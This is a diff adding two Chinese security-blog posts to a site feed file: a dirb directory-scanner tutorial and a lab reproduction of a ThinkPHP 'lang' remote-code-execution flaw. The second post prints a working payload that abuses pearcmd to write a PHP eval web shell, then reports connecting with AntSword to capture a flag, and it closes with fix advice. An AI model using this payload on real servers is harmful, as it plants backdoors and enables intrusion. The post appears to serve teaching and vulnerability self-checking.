@@ -4,6 +4,58 @@
   
   
   <entry>
+    <title>dirb扫描工具</title>
+    <link href="/2023/05/11/dirb%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"/>
+    <url>/2023/05/11/dirb%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/</url>
+    
+    <content type="html"><![CDATA[<h1 id="dirb-命令行-模式详解"><a href="#dirb-命令行-模式详解" class="headerlink" title=" dirb(命令行)模式详解"></a><center> dirb(命令行)模式详解</h1><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><h2 id="此文章用于提高网络安全，漏洞复现用于漏洞自查。在此学习到的所有知识请用于正规合法途径切莫以身试法，不要对没有授权的网站或者系统进行扫描，入侵，攻击。"><a href="#此文章用于提高网络安全，漏洞复现用于漏洞自查。在此学习到的所有知识请用于正规合法途径切莫以身试法，不要对没有授权的网站或者系统进行扫描，入侵，攻击。" class="headerlink" title="此文章用于提高网络安全，漏洞复现用于漏洞自查。在此学习到的所有知识请用于正规合法途径切莫以身试法，不要对没有授权的网站或者系统进行扫描，入侵，攻击。"></a>此文章用于提高网络安全，漏洞复现用于漏洞自查。在此学习到的所有知识请用于正规合法途径切莫以身试法，不要对没有授权的网站或者系统进行扫描，入侵，攻击。</h2><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="dirb简介"><a href="#dirb简介" class="headerlink" title="dirb简介"></a>dirb简介</h1><p>dirb是一个基于字典的web目录扫描工具，查找现有的（和&#x2F;或隐藏的）Web对象，通过对Web服务器发起基于字典的攻击并分析响应的数据。 采用递归的方式来获取更多的目录，它还支持代理和http认证限制访问的网站，是在信息收集阶段获取目标信息常用工具手段。<br>DirBuster支持全部的Web目录扫描方式。它既支持网页爬虫方式扫描，也支持基于字典暴力扫描，还支持纯暴力扫描。该工具使用Java语言编写，提供命令行（Headless）和图形界面（GUI）两种模式。其中，图形界面模式功能更为强大。用户不仅可以指定纯暴力扫描的字符规则，还可以设置以URL模糊方式构建网页路径。同时，用户还对网页解析方式进行各种定制，提高网址解析效率。<br>#</p><h1 id="dirb使用"><a href="#dirb使用" class="headerlink" title="dirb使用"></a>dirb使用</h1><h2 id="1、语法格式"><a href="#1、语法格式" class="headerlink" title="1、语法格式"></a>1、语法格式</h2><blockquote><p>dirb <url_base> [&lt;wordlist_file(s)&gt;] [options]</p></blockquote><h2 id="2、命令参数"><a href="#2、命令参数" class="headerlink" title="2、命令参数"></a>2、命令参数</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-a &lt;agent_string&gt;：指定您的定制USER_AGENT。</span><br><span class="hljs-deletion">-c &lt;cookie_string&gt;：为HTTP请求设置cookie。</span><br><span class="hljs-deletion">-f：精细调整NOT_FOUND（404）检测。</span><br><span class="hljs-deletion">-H &lt;header_string&gt;：将自定义标头添加到HTTP请求。</span><br><span class="hljs-deletion">-i：使用不区分大小写的搜索。</span><br><span class="hljs-deletion">-l：找到时打印“ Location”标题。</span><br><span class="hljs-deletion">-N &lt;nf_code&gt;：忽略此HTTP代码的响应。</span><br><span class="hljs-deletion">-o &lt;输出文件&gt;：将输出保存到磁盘。</span><br><span class="hljs-deletion">-p &lt;代理[：端口]&gt;：使用此代理。（默认端口为1080）</span><br><span class="hljs-deletion">-P &lt;proxy_username：proxy_password&gt;：代理身份验证。</span><br><span class="hljs-deletion">-r：不要递归搜索。</span><br><span class="hljs-deletion">-R：交互式递归。（询问每个目录）</span><br><span class="hljs-deletion">-S：静默模式。不要显示经过测试的单词。（用于哑终端）</span><br><span class="hljs-deletion">-t：不要在网址上强制使用结尾的“ /”。</span><br><span class="hljs-deletion">-u &lt;用户名：密码&gt;：HTTP身份验证。</span><br><span class="hljs-deletion">-v：也显示NOT_FOUND页。</span><br><span class="hljs-deletion">-w：不要在警告消息上停止。</span><br><span class="hljs-deletion">-X &lt;扩展名&gt; / -x &lt;扩展名文件&gt;：在每个单词后加上该扩展名。</span><br><span class="hljs-deletion">-z：添加毫秒延迟，以免导致过多的Flood。</span><br><br></code></pre></td></tr></table></figure><h2 id="3、常见用法"><a href="#3、常见用法" class="headerlink" title="3、常见用法"></a>3、常见用法</h2><h3 id="1、对目标进行基本的扫描"><a href="#1、对目标进行基本的扫描" class="headerlink" title="1、对目标进行基本的扫描"></a>1、对目标进行基本的扫描</h3><h4 id="1、使用默认字典"><a href="#1、使用默认字典" class="headerlink" title="1、使用默认字典"></a>1、使用默认字典</h4><blockquote><p>dirb <a href="http://127.0.0.1/">http://127.0.0.1/</a>  #<a href="http://1127.0.0.1/">http://1127.0.0.1/</a> 为目标地址</p></blockquote><h4 id="2、指定字典"><a href="#2、指定字典" class="headerlink" title="2、指定字典"></a>2、指定字典</h4><blockquote><p>dirb <a href="http://127.0.0.1/">http://127.0.0.1/</a> &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;big.txt </p></blockquote><h3 id="2、查看存在的字典"><a href="#2、查看存在的字典" class="headerlink" title="2、查看存在的字典"></a>2、查看存在的字典</h3><h4 id="1、查看所有字典"><a href="#1、查看所有字典" class="headerlink" title="1、查看所有字典"></a>1、查看所有字典</h4><blockquote><p>&#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists 具体查看自己的dirb安装目录</p></blockquote><h4 id="2、Dirb的默认字典：common-txt"><a href="#2、Dirb的默认字典：common-txt" class="headerlink" title="2、Dirb的默认字典：common.txt"></a>2、Dirb的默认字典：common.txt</h4><blockquote><p>&#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt</p></blockquote><h4 id="3、扫描存在特点扩展名列表的目录"><a href="#3、扫描存在特点扩展名列表的目录" class="headerlink" title="3、扫描存在特点扩展名列表的目录"></a>3、扫描存在特点扩展名列表的目录</h4><p>在很多情况下，我们需要在目标服务器上提取特定扩展名的目录，然后可以使用dirb扫描的-X参数。此参数接受文件扩展名，然后在目标服务器或计算机上搜索给定的扩展名文件。</p><blockquote><p>dirb <a href="http://127.0.0.1/">http://127.0.0.1/</a> -X .txt #127.0.0.1为目标地址，.txt为我们需要搜索的指定扩展名文件</p></blockquote><h4 id="4、将产出保存到特定文件"><a href="#4、将产出保存到特定文件" class="headerlink" title="4、将产出保存到特定文件"></a>4、将产出保存到特定文件</h4><blockquote><p>dirb <a href="http://127.0.0.1/">http://127.0.0.1/</a> -o output.txt #127.0.0.1为目标地址， output.txt为将输出保存的文件名</p></blockquote><h4 id="5、指定状态码不输出"><a href="#5、指定状态码不输出" class="headerlink" title="5、指定状态码不输出"></a>5、指定状态码不输出</h4><blockquote><p>dirb <a href="http://127.0.0.1/">http://127.0.0.1/</a> -N 200 #127.0.0.1为目标地址，200为我们忽略的状态码</p></blockquote><p>忽略了他就不会产出<br>从前面的工作我们知道是有产出这里，是没有产出的，也就是说前面的产出状态码全部是200的</p><h4 id="6、设置速度延迟"><a href="#6、设置速度延迟" class="headerlink" title="6、设置速度延迟"></a>6、设置速度延迟</h4><blockquote><p>dirb <a href="http://127.0.0.1/">http://127.0.0.1/</a> -z 100  #127.0.0.1为目标地址，100为我们给定的扫描延迟</p></blockquote><h4 id="7、取消递归扫描"><a href="#7、取消递归扫描" class="headerlink" title="7、取消递归扫描"></a>7、取消递归扫描</h4><p>默认情况下，dirb扫描以递归方式扫描目录。它将扫描目录，然后遍历该目录以扫描更多子目录。但是在某些情况下，如果时间不足，我们会将Dirb设置为不递归扫描。<br>1、-r不递归<br>dirb <a href="http://127.0.0.1/public/">http://127.0.0.1/public/</a> -r #127.0.0.1为目标地址</p><h4 id="8、显示不存在页面"><a href="#8、显示不存在页面" class="headerlink" title="8、显示不存在页面"></a>8、显示不存在页面</h4><blockquote><p>dirb <a href="http://127.0.0.1/">http://127.0.0.1</a> -v #127.0.0.1为目标地址</p></blockquote><p>404的都进行了显示，也就是整个字典都会被显示出来</p><h4 id="9、HTTP授权进行扫描"><a href="#9、HTTP授权进行扫描" class="headerlink" title="9、HTTP授权进行扫描"></a>9、HTTP授权进行扫描</h4><blockquote><p>dirb <a href="http://127.0.0.1/admin">http://127.0.0.1/admin</a> -u user:passwd#127.0.0.1为目标地址，</p></blockquote><p>user:passwd为用户名和密码</p><h4 id="10、代理网址"><a href="#10、代理网址" class="headerlink" title="10、代理网址"></a>10、代理网址</h4><p>使用–p选项可将代理URL用于所有请求，默认情况下，它可在端口1080上使用</p><blockquote><p>dirb 127.0.0.1&#x2F; &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;big.txt –p 127.0.0.1:8080   #127.0.0.01为目标地址，&#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;big.txt为指定字典，127.0.0.1:8080为我们设置的代理地址以及端口<br>#</p></blockquote><h1 id="完结"><a href="#完结" class="headerlink" title="完结"></a>完结</h1>]]></content>
+    
+    
+    <categories>
+      
+      <category>工具</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>工具</tag>
+      
+      <tag>扫描</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>thinkphp lang 命令执行</title>
+    <link href="/2023/05/10/thinkphp-lang-rce/"/>
+    <url>/2023/05/10/thinkphp-lang-rce/</url>
+    
+    <content type="html"><![CDATA[<h1 id="thinkphp-lang-命令执行复现"><a href="#thinkphp-lang-命令执行复现" class="headerlink" title="thinkphp lang 命令执行复现"></a><center>thinkphp lang 命令执行复现</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><h3 id="此文章用于提高网络安全，漏洞复现用于漏洞自查。在此学习到的所有知识请用于正规合法途径切莫以身试法，不要对没有授权的网站或者系统进行扫描，入侵，攻击。"><a href="#此文章用于提高网络安全，漏洞复现用于漏洞自查。在此学习到的所有知识请用于正规合法途径切莫以身试法，不要对没有授权的网站或者系统进行扫描，入侵，攻击。" class="headerlink" title="此文章用于提高网络安全，漏洞复现用于漏洞自查。在此学习到的所有知识请用于正规合法途径切莫以身试法，不要对没有授权的网站或者系统进行扫描，入侵，攻击。"></a>此文章用于提高网络安全，漏洞复现用于漏洞自查。在此学习到的所有知识请用于正规合法途径切莫以身试法，不要对没有授权的网站或者系统进行扫描，入侵，攻击。</h3><h2 id="漏洞简介："><a href="#漏洞简介：" class="headerlink" title="漏洞简介："></a>漏洞简介：</h2><h3 id="ThinkPHP，是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架。当特定版本的ThinkPHP开启多语言功能，并且存在扩展pear时，攻击者可以构造lang参数实现远程代码执行。"><a href="#ThinkPHP，是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架。当特定版本的ThinkPHP开启多语言功能，并且存在扩展pear时，攻击者可以构造lang参数实现远程代码执行。" class="headerlink" title="ThinkPHP，是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架。当特定版本的ThinkPHP开启多语言功能，并且存在扩展pear时，攻击者可以构造lang参数实现远程代码执行。"></a>ThinkPHP，是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架。当特定版本的ThinkPHP开启多语言功能，并且存在扩展pear时，攻击者可以构造lang参数实现远程代码执行。</h3><h2 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h2><blockquote><p>ThinkPHP 6.0.x<br><br>ThinkPHP 5.1.x<br><br>ThinkPHP 5.0.x<br></p></blockquote><h2 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h2><h3 id="靶场："><a href="#靶场：" class="headerlink" title="靶场："></a>靶场：</h3><p>地址：<a href="https://vulfocus.cn/">https://vulfocus.cn</a></p><h3 id="启动靶场："><a href="#启动靶场：" class="headerlink" title="启动靶场："></a>启动靶场：</h3><p><img src="/img/thinkphplang/1.png" alt="靶场"> <br></p><p>访问地址 <a href="http://123.58.224.8:38673/">http://123.58.224.8:38673</a><br><br><img src="http://shelldir.cn/img/thinkphplang/2.png" alt="访问地址"><br><br>访问路径 <a href="http://123.58.224.8:38673/public/index.php">http://123.58.224.8:38673/public/index.php</a><br><br><img src="http://shelldir.cn/img/thinkphplang/3.png" alt="访问路径"><br></p><h3 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h3><p>打开burp 访问其获得的地址抓包 获得的包放入repeater模块并修改包添加payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?lang=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>pearcmd&amp;+config-create+<span class="hljs-regexp">/&lt;?=@eval($_REQUEST[&#x27;shell&#x27;]);?&gt;+/</span>var<span class="hljs-regexp">/www/</span>html/shell.php<br></code></pre></td></tr></table></figure><p><img src="http://shelldir.cn/img/thinkphplang/4.png" alt="复现"><br><br><img src="http://shelldir.cn/img/thinkphplang/5.png" alt="复现"><br><br><img src="http://shelldir.cn/img/thinkphplang/6.png" alt="复现"><br><br><img src="http://shelldir.cn/img/thinkphplang/7.png" alt="复现"><br></p><p>蚁剑连接<br><br><img src="http://shelldir.cn/img/thinkphplang/8.png" alt="蚁剑"><br><br>成功获取flag<br><br><img src="http://shelldir.cn/img/thinkphplang/9.png" alt="flag"><br></p><h2 id="修复建议："><a href="#修复建议：" class="headerlink" title="修复建议："></a>修复建议：</h2><h3 id="php-ini中的register-argc-argv设置为Off，禁止url传入命令行参数；或升级版本。"><a href="#php-ini中的register-argc-argv设置为Off，禁止url传入命令行参数；或升级版本。" class="headerlink" title="php.ini中的register_argc_argv设置为Off，禁止url传入命令行参数；或升级版本。"></a>php.ini中的register_argc_argv设置为Off，禁止url传入命令行参数；或升级版本。</h3>]]></content>
+    
+    
+    <categories>
+      
+      <category>漏洞复现</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>thinkphp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>漏洞扫描工具afrog</title>
     <link href="/2023/05/02/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7afrog/"/>
     <url>/2023/05/02/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7afrog/</url>
